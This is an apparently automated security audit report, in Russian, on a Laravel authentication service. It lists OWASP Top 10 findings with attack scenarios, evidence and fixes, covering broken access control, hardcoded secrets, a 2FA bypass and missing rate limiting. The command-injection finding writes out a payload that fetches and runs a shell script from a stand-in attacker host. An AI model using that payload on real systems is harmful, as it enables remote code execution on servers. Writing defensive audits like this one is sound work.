# Отчёт по анализу безопасности

## A01:2021 — Нарушение контроля доступа (Broken Access Control)

### Staging-эндпоинты управления ролями позволяют назначать/снимать роли без каких‑либо проверок авторизации

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-862

**Описание:**

Контроллер для окружения staging предоставляет эндпоинты, которые напрямую назначают или снимают роли для произвольного `User` (через route-model binding), но не применяет никакой аутентификации/авторизации (нет проверок Gate/policy, нет защитного bypass-ограничителя наподобие IsSystemRequest, в контроллере не видно auth middleware). Если эти роуты доступны в развёрнутой среде (ошибка регистрации роутов, неверно применён stage.env middleware или путаница окружений), атакующий сможет сам себе назначить привилегированные роли.

**Сценарий атаки:**

Атакующий вызывает staging-эндпоинт (например, `/api/.../staging/user-role/addRole/{user}/{role}`) со своим `user id` и именем высокопривилегированной роли (`admin/operators-admin`). Поскольку контроллер проверяет лишь существование роли, он назначает роль целевому пользователю. Атакующий повышает привилегии и получает доступ к защищённым API.

**Влияние:**

Вертикальная эскалация привилегий; полный компромисс модели авторизации при возможности назначать привилегированные роли/права. Потенциальная утечка данных и выполнение административных действий.

**Доказательства:**

-   **Расположение:** `app/Http/Controllers/Staging/UserRoleController.php (lines 1-62)`
    -   **Chunk ID:** `file:app/Http/Controllers/Staging/UserRoleController.php`
    -   **Детали:** `addRole()/delRole()` назначает/снимает роли без проверок авторизации (валидируется только факт существования Role).

**Рекомендации:**

Убедиться, что staging-контроллеры не деплоятся или строго защищены. Добавить явные middleware (auth + ограничение по окружению) и проверки авторизации (например, `Gate::authorize('user-roles.update', $user)` или «только системные запросы»). Предпочтительно удалить эти эндпоинты из не‑тестовых сборок.

---

### Неаутентифицированный внешний эндпоинт раскрывает существование пользователя и административный статус по GA UID

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-639

**Описание:**

Внешний эндпоинт GA UID зарегистрирован вне группы middleware `auth.api` и принимает запросы, у которых `FormRequest::authorize()` возвращает `true`. Когда пользователь не залогинен, эндпоинт ищет пользователя по переданному `ga_uid` (`payload->ga_uid`) и возвращает `userId`, `isAdmin`, `entity_type`, поля компании и метаданные подписки/типа аккаунта. Это позволяет проводить перечисление пользователей в стиле IDOR и делать выводы о привилегиях без аутентификации.

**Сценарий атаки:**

Атакующий отправляет множество значений `ga_uid` (подбор, утечки из аналитики или brute force). Для каждого валидного `ga_uid` эндпоинт возвращает ненулевой `userId` и флаг, является ли пользователь администратором, а также дополнительные поля профиля. Это позволяет перечислять аккаунты, выделять администраторов и потенциально связывать аналитические идентификаторы с внутренними `user_id`.

**Влияние:**

Перечисление пользователей, раскрытие привилегированного статуса (`isAdmin`) и метаданных аккаунта; ущерб приватности и повышение эффективности таргетированных атак.

**Доказательства:**

-   **Расположение:** `routes/api.php (lines 1-220)`
    -   **Chunk ID:** `file:routes/api.php`
    -   **Детали:** Группа роутов `external` публикует `ga-uid store` без middleware `auth.api`.
-   **Расположение:** `app/Http/Controllers/External/GaUserController.php (lines 1-120)`
    -   **Chunk ID:** `file:app/Http/Controllers/External/GaUserController.php`
    -   **Детали:** При отсутствии аутентификации контроллер находит пользователя по `payload->ga_uid` и возвращает в ответе `userId` и `isAdmin`.
-   **Расположение:** `app/Http/Requests/External/StoreGaUserRequest.php (lines 1-39)`
    -   **Chunk ID:** `file:app/Http/Requests/External/StoreGaUserRequest.php`
    -   **Детали:** `authorize()` возвращает `true`; правила допускают неаутентифицированные запросы, если `ga_uid` существует в таблице `users`.

**Рекомендации:**

Требовать аутентификацию или подписанный server-to-server токен для `/auth/external/ga-uid`. Если эндпоинт обязан быть публичным — возвращать обобщённый ответ, не раскрывающий `userId/isAdmin`, и включить строгий rate limiting и мониторинг. Рассмотреть хеширование/ротацию идентификаторов и избегать прямого поиска по постоянным ID, присылаемым клиентом.

---

### Неаутентифицированный внешний эндпоинт может запускать действия (подписка MailBook) без авторизации

**ID находки:** `A01-W-CRIT-003`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-862

**Описание:**

Внешний эндпоинт mail-book доступен без auth middleware, и `FormRequest::authorize()` возвращает `true`. Это позволяет любому отправить email для добавления в рассылку (через `MaxMailing::addUser`) — чувствительное действие, которое можно злоупотреблять.

**Сценарий атаки:**

Атакующий скриптует запросы к `/auth/external/mail-book` с email жертв, вызывая нежелательные подписки (спам), потенциальные репутационные/юридические проблемы и злоупотребление сервисом/стоимостью. Поскольку ответы различают успех/ошибку, это может также помогать валидации email.

**Влияние:**

Неавторизованное изменение состояния во внешней системе, злоупотребление интеграцией email-маркетинга, возможные комплаенс‑риски.

**Доказательства:**

-   **Расположение:** `routes/api.php (lines 1-220)`
    -   **Chunk ID:** `file:routes/api.php`
    -   **Детали:** Группа роутов `external` публикует `mail-book store` без middleware `auth.api`.
-   **Расположение:** `app/Http/Controllers/External/MailBookUserController.php (lines 1-45)`
    -   **Chunk ID:** `file:app/Http/Controllers/External/MailBookUserController.php`
    -   **Детали:** `store()` вызывает внешний `MaxMailing->addUser()` исключительно на основании данных запроса.
-   **Расположение:** `app/Http/Requests/External/StoreMailBookUser.php (lines 1-38)`
    -   **Chunk ID:** `file:app/Http/Requests/External/StoreMailBookUser.php`
    -   **Детали:** `authorize()` возвращает `true` для всех.

**Рекомендации:**

Защитить эндпоинт (auth или общий секрет/HMAC), применить строгий rate limiting и рассмотреть double opt-in. Избегать раскрытия детальных различий «успех/ошибка» для неаутентифицированных клиентов.

---

## A02:2021 — Криптографические ошибки (Cryptographic Failures)

### Захардкоженные секреты в Kubernetes ConfigMap, закоммиченные в репозиторий (JWT, DB, RabbitMQ, Pusher, S3, reCAPTCHA) +/-

**ID находки:** `A02-CRYPTO-001`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-798

**Описание:**

Чувствительные учётные данные и криптографические секреты хранятся напрямую в конфигурации деплоя под контролем версий. Kubernetes ConfigMap содержит секрет подписи JWT, пароль БД, пароль RabbitMQ, Pusher secret, ключи доступа S3 и секретный ключ reCAPTCHA. Любой, у кого есть доступ на чтение к репозиторию (или утекшим артефактам), может получить эти секреты.

**Сценарий атаки:**

Атакующий, получивший доступ на чтение к репозиторию (например, через утечки CI логов/артефактов, ошибочные права доступа к репозиторию, компрометацию машины разработчика), извлекает `JWT_SECRET` и другие креды. Он может выпускать валидные JWT (имперсонация), получать доступ к БД/очереди, выгружать объекты из S3 и отправлять broadcast‑события через Pusher.

**Влияние:**

Полный компромисс доверия аутентификации/авторизации (для интеграций с JWT‑подписью), повторное использование учётных данных против инфраструктурных компонентов (DB/RabbitMQ/S3), эксфильтрация данных и потенциальное боковое перемещение между окружениями.

**Доказательства:**

-   **Расположение:** `automation/k8s/cfg/configmap-auth-service.yaml (lines 1-80)`
    -   **Chunk ID:** `file:automation/k8s/cfg/configmap-auth-service.yaml`
    -   **Детали:** ConfigMap содержит `JWT_SECRET`, `DB_PASSWORD`, `RABBITMQ_PASSWORD`, `PUSHER_APP_SECRET`, S3 ключи, `RECAPTCHA_SECRET_KEY` и т. п.

**Рекомендации:**

Удалить все секреты из ConfigMap и истории коммитов; использовать Kubernetes Secrets (или внешний secret manager) и немедленно выполнить ротацию всех раскрытых учётных данных.

---

### Захардкоженные учётные данные и app key в примерных env‑файлах репозитория

**ID находки:** `A02-CRYPTO-002`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-798

**Описание:**

Репозиторий включает пример `.env` и локальный `docker-compose` с учётными данными и секретами (`APP_KEY`, `JWT_SECRET`, пароли БД, пароль RabbitMQ, S3 креды). Даже если это «для локальной разработки», такие паттерны часто приводят к повторному использованию в реальных окружениях и усиливают «разрастание» секретов. Они также помогают атакующим, предлагая дефолтные пароли/ключи для перебора.

**Сценарий атаки:**

Атакующий атакует развёрнутый инстанс, где дефолты не были изменены (часто в staging/dev). Используя известные `DB_PASSWORD/auth_secret` или `JWT_SECRET=some-secret`, он получает доступ к сервисам или подделывает токены, что ведёт к захвату аккаунтов или компрометации сервиса.

**Влияние:**

Потенциальный несанкционированный доступ к БД/очередям и подделка токенов в окружениях, где секреты переиспользованы; ускорение атак credential stuffing против внутренних сервисов.

**Доказательства:**

-   **Расположение:** `.env.example (lines 1-60)`
    -   **Chunk ID:** `file:.env.example`
    -   **Детали:** Содержит `APP_KEY`, `JWT_SECRET=some-secret`, `DB_PASSWORD`, `RABBITMQ_PASSWORD=password`, `S3_LOCAL_AWS_SECRET_ACCESS_KEY=minio123` и т. п.
-   **Расположение:** `docker-compose.yaml (lines 1-55)`
    -   **Chunk ID:** `file:docker-compose.yaml`
    -   **Детали:** Содержит `POSTGRES_PASSWORD=auth_secret`, а также переменные приложения с `DB_PASSWORD=auth_secret` и Pusher secrets.

**Рекомендации:**

Удалить plaintext‑секреты из отслеживаемых файлов. Заменить на плейсхолдеры и документацию. Обеспечить, чтобы CI блокировал коммиты с секретами, и выполнить ротацию всех секретов, совпадающих с этими значениями.

---

## A03:2021 — Инъекции (Injection)

### OS Command Injection через `shell_exec()` с несанитизированным GET‑параметром в QA‑скрипте

**ID находки:** `A03-CMD-001`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-78

**Описание:**

QA‑хелпер эндпоинт исполняет shell‑pipeline (`redis-cli | tail | awk | tr`) и напрямую конкатенирует недоверенный ввод пользователя (`$_GET['phone']`) в строку команды. Это позволяет shell‑метасимволам (например, `;`, `|`, backticks, `$()`, редиректы) менять исполняемую команду.

**Сценарий атаки:**

Атакующий вызывает `/build/qa-scripts/qa.php?phone=";curl http://attacker/pwn.sh|sh;#`, из‑за чего сервер исполняет произвольные OS‑команды от имени пользователя веб‑сервера. Даже если скрипт задуман «для QA», при доступности в любом окружении это превращается в RCE.

**Влияние:**

Удалённое выполнение кода (RCE); кража секретов окружения (`REDIS_PASSWORD`), боковое перемещение, уничтожение данных и полный компромисс сервера.

**Доказательства:**

-   **Расположение:** `build/qa-scripts/qa.php (lines 1-4)`
    -   **Chunk ID:** `file:build/qa-scripts/qa.php`
    -   **Детали:** строка команды `shell_exec()` конкатенирует `$_GET['phone']` в shell pipeline `redis-cli`.

**Рекомендации:**

Удалить этот скрипт из любых развёрнутых окружений. Если он необходим — ограничить доступ (network allowlist + auth), полностью избегать shell (использовать Redis client library) и строго валидировать телефон как «только цифры». Никогда не конкатенировать пользовательский ввод в shell‑команды; если избежать невозможно — использовать `escapeshellarg` и избегать сложных pipeline.

---

## A04:2021 — Небезопасный дизайн (Insecure Design)

### Login‑эндпоинт не имеет маршрутного throttling и использует слабый ключ лимита, контролируемый пользователем

**ID находки:** `A04-W1`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-307

**Описание:**

API использует глобальный throttle (группа middleware `api`), но основной login‑эндпоинт (по логину/паролю) не защищён явным строгим, выделенным rate limit. Вместо этого throttling реализован через Redis‑счётчик, ключ которого строится только по строке `email/login`, присланной пользователем. Такой дизайн слабее, чем throttling на уровне route/IP/user, потому что его можно обходить ротацией имён пользователей/email, и он не предотвращает высокочастотный password spraying по множеству аккаунтов с одного IP. Также он привязывает контроль безопасности к пользовательскому вводу, а не к стабильной идентичности актёра (IP/устройство/пользователь).

**Сценарий атаки:**

Атакующий проводит password spraying с небольшого ботнета или даже с одного IP, пытаясь один пароль для тысяч известных email. Поскольку Redis‑блокировка ведётся «на строку логина», каждый аккаунт остаётся ниже порога «на пользователя», при этом общий объём попыток остаётся большим. Если глобальный throttle выставлен высоко (или обходится для системных запросов), атакующий может быстро проверить множество учётных данных и в итоге получить доступ хотя бы к одному аккаунту.

**Влияние:**

Компрометация аккаунтов через password spraying/brute force; рост риска мошенничества; рост нагрузки из‑за большого числа попыток; возможная блокировка конкретных пользователей при целенаправленном спаме по одному email.

**Доказательства:**

-   **Расположение:** `routes/api.php (lines 1-220)`
    -   **Chunk ID:** `file:routes/api.php`
    -   **Детали:** Группа роутов применяет явный throttling к `auth/check` и `auth/me`, но не к `auth/login` или `auth/signature`.
-   **Расположение:** `app/Http/Controllers/AuthController.php (lines 1-120)`
    -   **Chunk ID:** `file:app/Http/Controllers/AuthController.php`
    -   **Детали:** При ошибке логина инкрементирует Redis‑ключ `auth-attempt:<login>` с TTL 15 минут; IP‑throttling или route‑level throttling отсутствуют.
-   **Расположение:** `app/Http/Requests/StoreLoginRequest.php (lines 1-90)`
    -   **Chunk ID:** `file:app/Http/Requests/StoreLoginRequest.php`
    -   **Детали:** Блокирует только при `Redis auth-attempt:<email> >= 5`; ключ строится из пользовательского поля `email`.

**Рекомендации:**

Добавить выделенный строгий throttling для `/api/auth/auth/login` и `/api/auth/auth/signature` на основе IP + username (и, опционально, device fingerprint), с эскалацией санкций и временными блокировками. Предпочесть middleware Laravel `throttle` с кастомным key resolver или централизованный анти‑бот сервис. Redis‑счётчик «на логин» оставить как defense‑in‑depth сигнал, а не как основной контроль.

---

### Чувствительные неаутентифицированные потоки (активация регистрации, сброс пароля, доставка 2FA кода) не имеют явных anti‑automation контролей

**ID находки:** `A04-W2`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-799

**Описание:**

Несколько эндпоинтов, которые инициируют отправку SMS/email или выполняют чувствительные изменения состояния, не показывают явного throttling и защиты от ботов на уровне роутов: активация регистрации (отправляет SMS), сброс пароля по email/телефону (отправляет email/SMS) и `2FA get-code` (генерирует/рассылает код). Хотя глобальный API throttle существует, для подобных действий обычно требуется существенно более строгий лимит на IP/идентификатор цели, мониторинг злоупотреблений и иногда CAPTCHA/челлендж. Дополнительно, некоторые запросы содержат флаг `skipCaptcha` для staging, но в прод‑ветках кода нет очевидного принуждения к CAPTCHA.

**Сценарий атаки:**

Атакующий автоматизирует запросы к `password-reset-email` или `password-reset-mobile`, чтобы спамить жертв (email/SMS‑флуд) или генерировать операционные расходы. Также можно бить по SMS‑эндпоинтам активации, отправляя повторные коды на номер, снижая доступность и доверие. Для `2FA get-code`, если атакующий получит/угадает `user_id`, он может инициировать повторные 2FA сообщения для harassment или для попыток социнженерии.

**Влияние:**

SMS/email‑флуд и финансовые затраты, ухудшение UX, потенциальный отказ в обслуживании для легитимной аутентификации, рост нагрузки на поддержку, повышенный риск фишинга/социнженерии.

**Доказательства:**

-   **Расположение:** `routes/api.php (lines 1-120)`
    -   **Chunk ID:** `file:routes/api.php`
    -   **Детали:** Роуты `password-reset-email`, `password-reset-mobile`, `password-reset`, `register/activate` и `two-fa/get-code` определены без явного throttle middleware сверх глобальной группы.
-   **Расположение:** `app/Http/Controllers/ActivateController.php (lines 1-120)`
    -   **Chunk ID:** `file:app/Http/Controllers/ActivateController.php`
    -   **Детали:** В потоке активации отправляется SMS через `UserPhoneActivateSMSJob`, когда код отсутствует; явного throttling или CAPTCHA‑проверки не видно.
-   **Расположение:** `app/Http/Controllers/PasswordResetEmailController.php (lines 1-60)`
    -   **Chunk ID:** `file:app/Http/Controllers/PasswordResetEmailController.php`
    -   **Детали:** Генерирует hash для сброса пароля и диспатчит email job; не видно принудительного throttling/captcha.
-   **Расположение:** `app/Http/Controllers/PasswordResetMobileController.php (lines 1-80)`
    -   **Chunk ID:** `file:app/Http/Controllers/PasswordResetMobileController.php`
    -   **Детали:** Диспатчит `PasswordResetSMSJob` для отправки SMS кода; явных anti‑automation контролей нет.
-   **Расположение:** `app/Http/Controllers/TwoFAController.php (lines 1-70)`
    -   **Chunk ID:** `file:app/Http/Controllers/TwoFAController.php`
    -   **Детали:** `two-fa/get-code` инициирует генерацию кода и broadcast/job на основании `user_id`; явного throttling не показано.

**Рекомендации:**

Добавить строгие лимиты на IP и на идентификатор цели для этих эндпоинтов (email/phone/user_id). Требовать CAPTCHA или эквивалентную бот‑детекцию для анонимных стартовых эндпоинтов (register/email, password-reset-email/mobile) в production. Добавить мониторинг злоупотреблений и алерты на всплески. Убедиться, что отправка 2FA кода привязана к аутентифицированной/валидированной pre-auth сессии и жёстко лимитируется.

---

## A05:2021 — Ошибки конфигурации безопасности (Security Misconfiguration)

### Секреты и учётные данные закоммичены в конфигурации репозитория (ConfigMap и `.env.example`)

**ID находки:** `A05-W2`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-538

**Описание:**

В отслеживаемых конфигурационных файлах присутствуют разные креды/секреты, включая доступ к БД, JWT secret, Pusher secret, AWS keys, reCAPTCHA secret и пароли RabbitMQ. Часть из них находится в Kubernetes ConfigMap (а не в Secret), который не предназначен для чувствительных значений.

**Сценарий атаки:**

Атакующий с доступом к репозиторию, CI логам/артефактам или правами чтения ConfigMap в кластере может получить секреты. С AWS ключами он получает доступ к S3 бакетам; с `JWT_SECRET` — подделывает токены; с DB/RabbitMQ кредами — подключается к backend‑сервисам.

**Влияние:**

Полный компромисс конфиденциальности/целостности: подделка токенов, несанкционированная публикация/потребление сообщений, доступ к базе данных, злоупотребление сторонними сервисами и потенциальная эксфильтрация из S3.

**Доказательства:**

-   **Расположение:** `automation/k8s/cfg/configmap-auth-service.yaml (lines 1-120)`
    -   **Chunk ID:** `file:automation/k8s/cfg/configmap-auth-service.yaml`
    -   **Детали:** Содержит `DB_PASSWORD`, `JWT_SECRET`, `PUSHER_APP_SECRET`, S3 access keys, `RECAPTCHA_SECRET_KEY`, пароль RabbitMQ внутри ConfigMap.
-   **Расположение:** `.env.example (lines 1-120)`
    -   **Chunk ID:** `file:.env.example`
    -   **Детали:** Содержит примерные секреты/креды: `DB_PASSWORD`, `PUSHER_APP_SECRET`, `JWT_SECRET`, RabbitMQ admin/password, MinIO keys.
-   **Расположение:** `docker-compose.yaml (lines 1-80)`
    -   **Chunk ID:** `file:docker-compose.yaml`
    -   **Детали:** Содержит DB креды и задаёт сервисы с учётными данными прямо в compose.

**Рекомендации:**

Удалить все реальные секреты из истории репозитория; выполнить ротацию раскрытых учётных данных. Хранить чувствительные значения в Kubernetes Secrets или во внешнем secret manager (Vault/ASM/SSM). В `.env.example` и compose‑файлах оставить только не‑чувствительные плейсхолдеры.

---

### Небезопасная сборка контейнера: world‑writable директории и утечка приватного SSH‑ключа во время build

**ID находки:** `A05-W4`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-276

**Описание:**

Dockerfile выставляет права `0777` на `storage` и `bootstrap/cache`, а также содержит команды, которые листят и выводят приватный SSH‑ключ (`cat /var/www/.ssh/id_rsa`) на этапе сборки. Права `0777` позволяют подмену/тамперинг; печать приватного ключа создаёт риск утечки через build‑логи или промежуточные слои image.

**Сценарий атаки:**

Атакующий с доступом к runtime контейнера, скомпрометированным веб‑процессом или на «общем» хосте может модифицировать world‑writable директории, чтобы подложить вредоносные файлы, изменить кэшированные config/routes или повлиять на поведение приложения. Если доступны build‑логи/артефакты, приватный SSH‑ключ можно украсть и использовать для доступа к приватным репозиториям или инфраструктуре.

**Влияние:**

Потенциальное RCE/компрометация приложения через writable директории; утечка приватных SSH‑ключей, приводящая к supply chain компромиссу.

**Доказательства:**

-   **Расположение:** `Dockerfile (lines 1-80)`
    -   **Chunk ID:** `file:Dockerfile`
    -   **Детали:** `chmod -Rf 0777` на `storage` и `bootstrap/cache`; печатает `/var/www/.ssh/id_rsa` во время сборки.

**Рекомендации:**

Удалить любые команды, которые читают/печатают приватные ключи; использовать build‑time SSH forwarding (BuildKit). Выставить минимально необходимые права (например, `0750/0770`) и обеспечить, чтобы писать мог только пользователь/группа приложения. Избегать world‑writable директорий.

---

## A07:2021 — Ошибки идентификации и аутентификации (Identification and Authentication Failures)

### Обход проверки 2FA: `/auth/two-fa/check-code` выдаёт access token без валидации кода

**ID находки:** `A07-CRIT-001`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-287

**Описание:**

Эндпоинт завершения 2FA выдаёт OAuth access token для переданного `user_id` и очищает 2FA коды, но никогда не проверяет корректность присланного 2FA‑кода. В результате атакующий, который получил/угадал валидный 2FA `hash` (или иным образом дошёл до этого эндпоинта), может завершить 2FA без OTP и получить полноценный доступ.

**Сценарий атаки:**

Атакующий получает валидный 2FA «hash» (например, из своей сессии, из‑за утечки в логах/referrer, или от другого пользователя через фишинг/подглядывание). Затем он вызывает `POST /auth/two-fa/check-code` с этим `hash` и любым 6‑значным кодом. Поскольку контроллер не проверяет код, он выдаёт токен для `user_id`, извлечённого из `hash`, и логинит атакующего как этого пользователя.

**Влияние:**

Полный обход второго фактора 2FA; захват аккаунта для пользователей с включённой 2FA.

**Доказательства:**

-   **Расположение:** `app/Http/Controllers/TwoFAController.php (lines 1-60)`
    -   **Chunk ID:** `file:app/Http/Controllers/TwoFAController.php`
    -   **Детали:** `checkCode()` выдаёт токен для `$request->user_id` и очищает коды; в контроллере отсутствует проверка `$request->code`.
-   **Расположение:** `app/Http/Requests/StoreTwoFARequest.php (lines 1-80)`
    -   **Chunk ID:** `file:app/Http/Requests/StoreTwoFARequest.php`
    -   **Детали:** Валидация вызывает `TwoFAСodeService::validateCodeRequest()` только в after‑hook валидатора; он добавляет ошибку, но не предотвращает выдачу токена, если контроллер достигнут и запрос прошёл валидацию. Сам контроллер не проверяет наличие ошибок валидации или корректность кода.
-   **Расположение:** `app/Services/TwoFAСodeService.php (lines 1-170)`
    -   **Chunk ID:** `file:app/Services/TwoFAСodeService.php`
    -   **Детали:** Содержит логику `checkCode()`, но она никогда напрямую не вызывается из `TwoFAController::checkCode()`.

**Рекомендации:**

Обеспечить server-side валидацию OTP в контроллере/сервисе до выдачи токенов. Очищать коды и выпускать токены только после успешной проверки; убедиться, что провалидированный `user_id` привязан к тому же `hash` и коду. Добавить аудит‑логирование и rate limits специально для 2FA‑эндпоинтов.

---

## A08:2021 — Ошибки целостности ПО и данных (Software and Data Integrity Failures)

### В CI/CD pipeline захардкожены учётные данные Artifactory/API key

**ID находки:** `A08-W2`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-798

**Описание:**

Конфигурация Bitbucket pipeline захардкоживает пароль Docker registry, пароль Artifactory и API key прямо в `bitbucket-pipelines.yml`. Это риск целостности CI/CD и supply chain: любой с доступом на чтение к репозиторию может эксфильтрировать секреты, пушить вредоносные образы/артефакты или модифицировать релизы.

**Сценарий атаки:**

Атакующий с доступом на чтение к репозиторию (или получивший доступ через утечку) извлекает креды/API key Artifactory из pipeline файла, логинится в registry и пушит троянизированный образ `auth-service:latest`. Дальнейшие деплои, которые тянут `latest`, запускают код атакующего.

**Влияние:**

Полный компромисс build‑артефактов/образов и потенциально production‑кластеров; потеря целостности ПО и возможная утечка данных.

**Доказательства:**

-   **Расположение:** `bitbucket-pipelines.yml (lines 1-130)`
    -   **Chunk ID:** `file:bitbucket-pipelines.yml`
    -   **Детали:** Захардкожены `docker login -p ...`, `ARTIFACTORY_PASSWORD` и `--apikey ...` в pipeline‑переменных.

**Рекомендации:**

Удалить все секреты из версионируемых pipeline‑файлов. Хранить их в Bitbucket secured variables/secret store, ограничить scope/права, немедленно выполнить ротацию утёкших учётных данных и по возможности использовать короткоживущие токены/OIDC.

---

### Dockerfile печатает приватный SSH‑ключ во время сборки image

**ID находки:** `A08-W3`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-312

**Описание:**

Production Dockerfile содержит команды, которые листят и выводят содержимое `/var/www/.ssh/id_rsa` во время сборки. Это может утечь в build‑логи и потенциально в промежуточные слои, подрывая provenance кода (доступ к приватному VCS) и позволяя дальнейшие supply chain атаки.

**Сценарий атаки:**

Злоумышленник, имеющий доступ к CI логам или build cache, получает напечатанный приватный SSH‑ключ и использует его для доступа к приватным репозиториям (например, внутренним пакетам Bitbucket), внедрения вредоносного кода или эксфильтрации проприетарного исходника.

**Влияние:**

Компрометация приватных репозиториев и доверия к build‑пайплайну; потенциальный долгоживущий supply chain компромисс нескольких сервисов.

**Доказательства:**

-   **Расположение:** `Dockerfile (lines 1-40)`
    -   **Chunk ID:** `file:Dockerfile`
    -   **Детали:** Шаги сборки: `RUN ls -la /var/www/.ssh/` и `RUN cat /var/www/.ssh/id_rsa`.

**Рекомендации:**

Удалить `RUN cat /var/www/.ssh/id_rsa` и любые подобные debug‑шаги. Использовать BuildKit SSH forwarding (`--ssh`) или CI‑предоставляемые ephemeral deploy keys и обеспечить, чтобы приватные ключи никогда не копировались в слои image или логи.

---

## A09:2021 — Ошибки логирования и мониторинга безопасности (Security Logging and Monitoring Failures)

### Ошибки аутентификации не логируются (разрыв видимости brute‑force и credential stuffing)

**ID находки:** `A09-W-001`

**Уровень критичности:** 🚨 **КРИТИЧЕСКИЙ**

**CWE:** CWE-778

**Описание:**

Login‑эндпоинты инкрементируют Redis‑счётчики при неуспешной аутентификации, но не формируют security‑логи (нет нормализации username/login, нет IP, user-agent, причины и исхода). Это мешает обнаружению/алертингу по brute‑force, credential stuffing и целевым атакам на аккаунты, а также усложняет инцидент‑респонс/аудит.

**Сценарий атаки:**

Атакующий выполняет credential stuffing против `/auth/login` с множеством логинов. Поскольку ошибки не логируются (есть только Redis‑счётчики), у защитников нет централизованного audit trail для обнаружения паттернов между инстансами, корреляции IP и триггера SIEM‑алертов. Атакующий может продолжать до нахождения валидных кредов, не создавая полезной security‑телеметрии.

**Влияние:**

Снижение способности обнаруживать, расследовать и реагировать на попытки компрометации аккаунтов; ослабление мониторинга/алертинга и потенциальный рост time‑to‑detection при инцидентах.

**Доказательства:**

-   **Расположение:** `app/Http/Controllers/AuthController.php (lines 1-214)`
    -   **Chunk ID:** `file:app/Http/Controllers/AuthController.php`
    -   **Детали:** В `login()` при ошибке только инкрементирует Redis `auth-attempt` и возвращает 422; нет `Log::warning/info`. Аналогично в `signature()` для iin‑аутентификации.

**Рекомендации:**

Добавить структурированное security‑логирование успешной/неуспешной аутентификации на уровне контроллера/сервиса или через события Laravel authentication events (`Login/Failed`). Включать: идентификатор логина (захешированный или частично замаскированный), `user_id` (если известен), IP клиента (с учётом trusted proxies), user-agent, outcome и correlation/request ID. Использовать корректные уровни (warning для ошибок, info для успеха) и направлять логи в централизованный sink.

---
